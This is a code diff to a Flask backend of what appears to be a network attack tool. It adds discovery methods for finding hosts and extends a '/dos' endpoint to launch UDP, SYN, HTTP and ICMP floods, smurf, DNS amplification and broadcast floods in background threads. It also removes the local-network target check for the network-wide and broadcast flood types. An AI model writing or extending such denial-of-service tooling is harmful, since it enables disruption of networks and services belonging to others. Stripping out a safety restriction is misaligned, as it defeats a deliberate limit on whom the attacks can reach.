@@ -336,7 +336,11 @@ def assets(filename):
 
 @app.route('/health', methods=['GET'])
 def api_health():
-    return jsonify({'status': 'online'})
+    return jsonify({
+        'status': 'online',
+        'timestamp': datetime.now().isoformat(),
+        'version': '1.0.4-PRO'
+    })
 
 @app.route('/scan', methods=['POST'])
 def api_scan():
@@ -357,26 +361,34 @@ def api_scan():
 def api_discovery():
     data = request.get_json()
     range_input = data.get('range')
-    if not range_input:
+    method = data.get('method', 'enhanced') # 'enhanced', 'ping', 'arp', 'smart'
+    
+    if not range_input and method != 'smart' and method != 'interfaces':
         return jsonify({'success': False, 'message': 'Missing range'}), 400
     
-    if not is_range_allowed(range_input):
+    if range_input and not is_range_allowed(range_input):
         return jsonify({'success': False, 'message': 'Network range outside local network (Restricted)'}), 403
         
-    # Use network_discovery from utils
-    results = network_discovery(range_input, enhanced=True)
-    return jsonify({'success': True, 'results': results})
-
-@app.route('/discovery/auto', methods=['POST'])
-def api_discovery_auto():
-    # Detect local network automatically
-    hostname = socket.gethostname()
-    local_ip = socket.gethostbyname(hostname)
-    ip_parts = local_ip.split('.')
-    network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
-    
-    results = network_discovery(network, enhanced=True)
-    return jsonify({'success': True, 'results': results, 'network': network})
+    results = []
+    if method == 'ping':
+        results = ping_sweep(range_input)
+    elif method == 'arp':
+        results = arp_scan(range_input)
+    elif method == 'smart':
+        results = smart_discovery()
+    elif method == 'gateway':
+        results, _ = discover_gateway_and_scan()
+    elif method == 'interfaces':
+        all_devices = []
+        interfaces = get_all_network_interfaces()
+        for iface in interfaces:
+            devices = ping_sweep(iface['network'])
+            if devices: all_devices.extend(devices)
+        results = all_devices
+    else:
+        results = network_discovery(range_input, enhanced=True)
+        
+    return jsonify({'success': True, 'results': results or []})
 
 @app.route('/os_detect', methods=['POST'])
 def api_os_detect():
@@ -414,33 +426,41 @@ def api_dos():
     data = request.get_json()
     ip = data.get('ip')
     port = data.get('port', 80)
-    packets = data.get('packetCount', 1000)
+    duration = data.get('duration', 10)
     attack_type = data.get('type', 'UDP_FLOOD')
-    threads = data.get('threads', 4)
+    threads = data.get('threads', 10)
     
     if not ip:
         return jsonify({'success': False, 'message': 'Missing target IP'}), 400
 
-    if not is_target_allowed(ip):
+    if not is_target_allowed(ip) and attack_type not in ['NETWORK_UDP', 'BROADCAST']:
         return jsonify({'success': False, 'message': 'Target IP outside local network range (Restricted)'}), 403
 
-    # Execute attack based on type
-    # Note: Using simplified duration/packet logic to bridge frontend and backend
-    duration = 10 # Default duration for API calls
-    
     def attack_task():
-        if attack_type == 'UDP_FLOOD':
-            udp_flood(ip, int(port), duration, int(threads))
-        elif attack_type == 'TCP_SYN':
-            tcp_flood(ip, int(port), duration, int(threads))
-        elif attack_type == 'HTTP_FLOOD':
-            http_flood(ip, duration, int(threads))
-        # Add more types as needed
+        try:
+            if attack_type == 'UDP_FLOOD':
+                udp_flood(ip, int(port), int(duration), int(threads))
+            elif attack_type == 'TCP_SYN':
+                tcp_flood(ip, int(port), int(duration), int(threads))
+            elif attack_type == 'HTTP_FLOOD':
+                http_flood(ip, int(duration), int(threads))
+            elif attack_type == 'ICMP_FLOOD':
+                icmp_flood(ip, int(duration), int(threads))
+            elif attack_type == 'SMURF':
+                smurf_attack(ip, int(duration), int(threads))
+            elif attack_type == 'DNS_AMP':
+                dns_amplification_attack(ip, int(duration), int(threads))
+            elif attack_type == 'NETWORK_UDP':
+                network_wide_udp_flood(ip, int(port), int(duration), int(threads))
+            elif attack_type == 'BROADCAST':
+                broadcast_udp_flood(ip, int(port), int(duration), int(threads))
+        except Exception as e:
+            print(f"Attack task failed: {e}")
 
     thread = threading.Thread(target=attack_task)
     thread.start()
     
-    return jsonify({'success': True, 'message': f'Attack {attack_type} started on {ip}'})
+    return jsonify({'success': True, 'message': f'Attack {attack_type} initiated on {ip}'})
 
 def is_target_allowed(target):
     """
